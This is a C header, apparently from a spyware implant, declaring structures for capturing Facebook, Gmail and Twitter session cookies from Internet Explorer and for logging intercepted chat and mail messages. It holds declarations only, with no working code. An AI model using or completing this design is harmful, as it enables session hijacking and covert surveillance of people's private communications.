#define SOCIAL_ENTRY_COUNT 5

#define SOCIAL_REQUEST_SUCCESS 0
#define SOCIAL_REQUEST_BAD_COOKIE 1
#define SOCIAL_REQUEST_NETWORK_PROBLEM 2

typedef unsigned long (*social_handler)(char *);

typedef struct {
	WCHAR domain[64];
	DWORD idle;
	BOOL wait_cookie;
	BOOL is_new_cookie;
	social_handler RequestHandler;
} social_entry_struct;

#define FACEBOOK_DOMAIN L"facebook.com"
#define GMAIL_DOMAIN L"mail.google.com"
#define TWITTER_DOMAIN L"twitter.com"

#define FACEBOOK_DOMAINA "facebook.com"
#define GMAIL_DOMAINA "mail.google.com"
#define TWITTER_DOMAINA "twitter.com"

#define MAPI_V3_0_PROTO	2012030601

#pragma pack(4)
struct MailSerializedMessageHeader {
  DWORD VersionFlags;       // flags for parsing serialized message
#define MAIL_FULL_BODY 0x00000001 // Ha catturato tutta la mail 
#define MAIL_INCOMING  0x00000010
#define MAIL_OUTGOING  0x00000000
  DWORD Flags;               // message flags
  DWORD Size;                // message size
  FILETIME date;			 // data di ricezione approssimativa del messaggio
 #define MAIL_GMAIL     0x00000000
  DWORD Program;
};
#pragma pack()

extern social_entry_struct social_entry[SOCIAL_ENTRY_COUNT];
extern void urldecode(char *src);
extern void JsonDecode(char *string);
extern void CheckProcessStatus();
extern void LogSocialIMMessageA(char *program, char *topic, char *peers, char *author, char *body, struct tm *tstamp);
extern void LogSocialIMMessageW(WCHAR *program, WCHAR *topic, WCHAR *peers, WCHAR *author, WCHAR *body, struct tm *tstamp);
extern void LogSocialMailMessage(DWORD program, char *from, char *rcpt, char *cc, char *subject, char *body, BOOL is_incoming);
extern void LogSocialMailMessageFull(DWORD program, BYTE *raw_mail, DWORD size, BOOL is_incoming);

extern WCHAR FACEBOOK_IE_COOKIE[512];
extern WCHAR GMAIL_IE_COOKIE[512];
extern WCHAR TWITTER_IE_COOKIE[512];




